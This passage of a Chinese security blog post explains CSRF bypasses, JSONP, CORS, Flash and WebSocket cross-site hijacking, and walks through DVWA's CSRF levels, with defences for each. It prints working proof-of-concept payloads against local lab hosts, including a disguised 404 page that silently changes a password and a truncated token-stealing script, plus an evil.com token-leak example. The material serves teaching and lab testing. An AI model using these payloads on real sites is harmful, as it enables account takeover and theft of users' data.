&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>思路：<a href="https://gh0st.cn/archives/2018-08-01/1" target="_blank" rel="noopener">组合拳绕过referer限制</a></p><blockquote><p>反射型XSS时受到了referer限制，通过URL重定向漏洞绕过referer限制触发XSS，xss处存在jsonp劫持漏洞，如果直接触发jsonp也受到referer限制，所以通过反射性xss加载jsonp的POC再配合URL跳转漏洞触发。总体上就是URL重定向绕过了xss的referer限制，xss又绕过了jsonp的referer限制。</p></blockquote><p>以上时key师傅的思路，由于文章中的任意URL跳转也是再子域，时referer允许的，个人认为可以直接加载jsonp的POC连接绕过。</p><h3 id="绕过token"><a href="#绕过token" class="headerlink" title="绕过token"></a>绕过token</h3><ul><li>GET型token泄露：例如页面包含<code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code></li><li>POST型token泄露:利用XSS漏洞获取其Cookie，查看存储在其中的Token(组合漏洞)</li></ul><h3 id="总结bypass方法"><a href="#总结bypass方法" class="headerlink" title="总结bypass方法"></a>总结bypass方法</h3><ul><li>删： CSRF token 、referer、 XRSF Header</li><li>置空： CSRF token 、referer</li><li>修改请求方法：POST改为GET</li><li>修改 与token相同长度的任意字符串替换token</li><li>固定token</li><li>组合漏洞：XSS+CSRF(xss打token,cookie或者利用子域的xss漏洞和csrf组合绕过验证)</li><li>token泄露（<a href="http://www.anquan.us/static/bugs/wooyun-2015-090935.html" target="_blank" rel="noopener">referer泄露toekn</a>）</li></ul><h2 id="读取型CSRF"><a href="#读取型CSRF" class="headerlink" title="读取型CSRF"></a>读取型CSRF</h2><blockquote><p>前面总结的CSRF是按提交方式分的，且场景是在增删改的情况下触发的，还有一种是读类型的CSRF，由jsonp劫持和CORS跨域资源共享，Flash跨域劫持等，通过这几种方式可以读一些敏感信息出来。</p></blockquote><h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &lt;script&gt;元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。</span><br><span class="line"> </span><br><span class="line">JSONP包含两部分：回调函数和数据。</span><br><span class="line">回调函数是当响应到来时要放在当前页面被调用的函数。</span><br><span class="line">数据就是传入回调函数中的json数据，也就是回调函数的参数了。</span><br></pre></td></tr></table></figure><p>jsonp劫持只需要有这个参数，再去读取这个参数就可以进行jsonp劫持了</p><p>jsonp劫持测试</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403076.19.png" alt></p><p>jsonp劫持在实际中也像上图这样调用返回一些信息，挖掘的时候利用如script标签跨域加载恶意的构造的语句即可劫持获取相应的信息</p><p>Poc如下所示:测试时只需要修改函数名test，以及劫持的地址即可，可以使用key写的pocbox,方便快捷</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">data</span>)</span>&#123; alert(<span class="built_in">JSON</span>.stringify(data)) &#125;&lt;<span class="regexp">/script&gt; &lt;script src="http:/</span><span class="regexp">/127.0.0.1/</span>DoraBox/csrf/jsonp.php?callback=test<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403500.71.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403521.67.png" alt></p><p>组合拳：<a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">JSONP绕过CSRF防护token </a></p><p>如果可以读取页面的CSRF-token,则可以自动加入触发写类型的CSRF，同时jsonp不只可以触发csrf漏洞，由于跨域标签，还可能会触发xss漏洞<code>?callback=&lt;script&gt;alert(1111)&lt;/script&gt;</code></p><p>修复方式：</p><ol><li>打乱响应主体内容</li><li>禁止用户自定义callback函数</li><li>Referer等进行限制</li><li>严格按照json标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）</li></ol><h3 id="CORS跨域资源共享"><a href="#CORS跨域资源共享" class="headerlink" title="CORS跨域资源共享"></a>CORS跨域资源共享</h3><blockquote><p>Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。 和jsonp的作用差不多，只不过是方式有所改变，那么我们在这个漏洞中的关键点就是Orgin这个参数的传递了，有时候我们需要自己添加有时候他有，而有时候他会通过某些参数传递 。</p></blockquote><p>CORS测试</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571405767.78.png" alt></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403804.38.png" alt></p><p>如上如图，在实际的测试中，如果在返回包中出现 Access-Control-Allow-*等响应头信息则时CORS跨域设置，尝试script标签等配合XMLHttpRequest劫持获取信息。<strong>在测试的时候亲请求头中添加Origin: <a href="http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。" target="_blank" rel="noopener">http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。</a> <code>Origin</code>和<code>Referer</code>很相似，就是将当前的请求参数删除，仅剩下</strong>三元组（协议 主机 端口）<strong>，标准的浏览器（IE浏览器除外，IE浏览器只带在协议和主机），会在每次请求中都带上<code>Origin</code>，至少在跨域操作时肯定携带（例如ajax的操作） </strong></p><p>POC如下(利用pocbox生成)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">'output'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">            <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            req.onload = reqListener;</span><br><span class="line">            req.open(<span class="string">'get'</span>,<span class="string">'http://127.0.0.1/DoraBox/csrf/userinfo.php '</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//req.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");</span></span><br><span class="line">            req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">            req.send();</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> output = <span class="built_in">document</span>.getElementById(<span class="string">'output'</span>);</span><br><span class="line">                output.innerHTML = <span class="string">"URL: http://127.0.0.1/DoraBox/csrf/userinfo.php &lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style='width: 659px; height: 193px;'&gt;"</span> + req.responseText + <span class="string">"&lt;/textarea&gt;"</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404697.35.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404749.23.png" alt></p><p><strong>利用CrossSiteContentHijacking测试</strong></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479827.75.png" alt></p><p>防御：</p><p>加强对Origin的验证，即对cors进行严格的设置</p><h3 id="Flash跨域"><a href="#Flash跨域" class="headerlink" title="Flash跨域"></a>Flash跨域</h3><blockquote><p>Flash跨域比较经典了，在做web目录资产整理的时候有时候会发现这样的文件 <strong>crossdomain.xml</strong> ，文件内容如果是如下的，那么就存在Flash跨域问题，如下内容的意思是支持所有域。flash跨域是通过.swf文件进行的，流程是：lsowl.top存在测试的swf文件想要跨域获取target.com中的敏感数据信息，首先会寻找target.com是否存在 <strong>crossdomain.xml</strong>  ，如果存在则会查看是否允许lsowl.top访问，如果可以访问则存在flash跨域漏洞。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">  &lt;allow-access-from domain=&quot;*&quot; /&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure><p>漏洞挖掘：由于没有找到测试的站点，所以文字描述，碰见存在<strong>crossdomain.xml</strong> 的站，访问看一下配置，再找找有无数据接口，然后利用POC <a href="https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf" target="_blank" rel="noopener">https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf</a> 进行测试，或者是key师傅的<a href="https://github.com/Acmesec/PoCBox" target="_blank" rel="noopener">pocbox</a></p><p>emm,没图，用key师傅的图<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571406720.75.png" alt></p><p>防御：</p><p>修改<strong>crossdomain.xml</strong>限制访问来源</p><h2 id="可读可写型CSRF"><a href="#可读可写型CSRF" class="headerlink" title="可读可写型CSRF"></a>可读可写型CSRF</h2><blockquote><p>WebSocket 跨域劫持漏洞,由于websocket协议支持双通道通信且websocket不受同源策略的影响，利用websocket的跨域劫持为可读可写类型</p></blockquote><h3 id="websocket的优点"><a href="#websocket的优点" class="headerlink" title="websocket的优点"></a>websocket的优点</h3><ul><li>支持全双工，实时性更强。</li><li>更好的二进制支持。</li><li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li><li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li></ul><h3 id="websocket就建立链接如下"><a href="#websocket就建立链接如下" class="headerlink" title="websocket就建立链接如下"></a>websocket就建立链接如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571476121.43.png" alt></h3><p>通过建立连接的过程可以发现在websocket建立连接时没有进行验证，所以由此产生漏洞。</p><p><a href="https://github.com/chyingp/blog/tree/master/demo/2017.05.22-web-socket/ws" target="_blank" rel="noopener">测试环境用到代码如下</a></p><p><strong>server.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server.js</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> wss = <span class="keyword">new</span> WebSocket.Server(&#123; <span class="attr">port</span>: <span class="number">9999</span> &#125;);</span><br><span class="line"> </span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> <span class="title">connection</span>(<span class="params">ws</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server: receive connection.'</span>);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> <span class="title">incoming</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received %s'</span>, message);</span><br><span class="line">        ws.send(<span class="string">'server: reply'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'pong'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received pong from client'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.send(<span class="string">'world'</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// setInterval(() =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     ws.ping('', false, true);</span></span><br><span class="line">    <span class="comment">// &#125;, 2000);</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.sendfile(__dirname + <span class="string">'/index.html'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p><strong>cal.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> magic = <span class="string">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span>;</span><br><span class="line"><span class="keyword">const</span> secWebSocketKey = <span class="string">'w4v7O6xFTi36lq3RNcgctw=='</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> secWebSocketAccept = crypto.createHash(<span class="string">'sha1'</span>)</span><br><span class="line">    .update(secWebSocketKey + magic)</span><br><span class="line">    .digest(<span class="string">'base64'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(secWebSocketAccept);</span><br><span class="line"><span class="comment">// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</span></span><br></pre></td></tr></table></figure><p><strong>index.html</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ws demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://192.168.1.101:9999'</span>);</span></span><br><span class="line"><span class="javascript">  ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: ws connection is open'</span>);</span></span><br><span class="line"><span class="javascript">    ws.send(<span class="string">'hello'</span>);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="javascript">  ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: received %s'</span>, e.data);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>监听服务端</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478485.67.png" alt></p><p>访问index.html发起请求，抓取数据包</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478624.46.png" alt></p><p>通过数据包可以看到，websocket通信要在http协议的基础上请求升级协议，升级的协议名为websocket,返回的数据包中说明了升级的协议以及正在连接的协议。</p><p>下图时通过websocket的通信过程<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478800.27.png" alt></p><p>在碰到使用使用websocket通信的目标时，测试方法和CORS类似， 篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478895.33.png" alt></p><h3 id="跨域劫持测试："><a href="#跨域劫持测试：" class="headerlink" title="跨域劫持测试："></a>跨域劫持测试：</h3><p>poc如下：使用pocbox生成(如果时https协议的站点则需要将ws修改为wss)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ws_attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://192.168.1.101:9999"</span>);</span><br><span class="line">    ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        ws.send(<span class="string">"asdfafasd"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        alert(evt);</span><br><span class="line">        ws.close();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">ws_attack();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479086.26.png" alt></p><p>触发</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479187.67.png" alt></p><p>防御：校验Origin头 ，websocket默认不校验</p><h2 id="CSRF实战——DVWA"><a href="#CSRF实战——DVWA" class="headerlink" title="CSRF实战——DVWA"></a>CSRF实战——DVWA</h2><blockquote><p>DVWA这里关于CSRF的漏洞点是重置密码</p></blockquote><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386809.77.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386943.9.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527389971.67.png" alt></h3><p>可以看到DVWA关于CSRF漏洞的出发点是GET请求，并且分析源码发现后台并没有任何过滤，直接出发CSRF漏洞</p><h4 id="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"><a href="#方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）" class="headerlink" title="方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）"></a>方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#</span><br></pre></td></tr></table></figure><h4 id="方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过"><a href="#方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过" class="headerlink" title="方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)"></a>方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;password_conf=attack&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568860685.1.png" alt></p><p>当诱导用户点击过后CSRF已经触发，密码已经被修改</p><h4 id="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"><a href="#方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）" class="headerlink" title="方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）"></a>方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861050.58.png" alt></h4><p>两种方式，在burp代理的情况下直接在浏览器中可以测试，或者可以将生成的POC(自己可以修改)复制下来，通过链接的形式来访问<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861215.33.png" alt></p><p>可以发现密码已经修改</p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861395.6.png" alt></p><p>用之前的POC进行触发发现漏洞无法触发，根据提示查看源码，发现源码对于referer头进行了限制，显示了server_name，这里就是本地的地址</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861469.09.png" alt></p><p>所以这里的思路就是必须要在点击构造好的链接，数据包中的referer要包含192.168.1.106，所以，将之前的POC复制下来，然后新建一个HTML，命名为192.168.1.106.html,让模拟攻击者放在可控服务器上，让用户访问(注意，burpsuit的POC注释掉history.pushState函数，否则无法在referer头中添加server_name)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="comment">/*history.pushState('', '', '/')*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.1.106/vulnerabilities/csrf/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;new"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password&amp;#95;conf"</span> <span class="attr">value</span>=<span class="string">"admin888"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862110.62.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862136.12.png" alt></p><p>可以看到：referer头限制成功绕过，漏洞触发。</p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><h4 id="方法一：结合存储型xss"><a href="#方法一：结合存储型xss" class="headerlink" title="方法一：结合存储型xss"></a>方法一：结合存储型xss</h4><p>点击修改密码后抓取数据包如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862268.49.png" alt></p><p>可以发现在请求中多了user_token,这样就可以使得csrf失效了，查看源码确认判断<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862497.23.png" alt></p><p>怎么绕过呢，思路：在请求前获取到服务端下发的token，然后带入请求劫持用户操作，触发CSRF，将POC构造为一下可以获取user_token。攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span 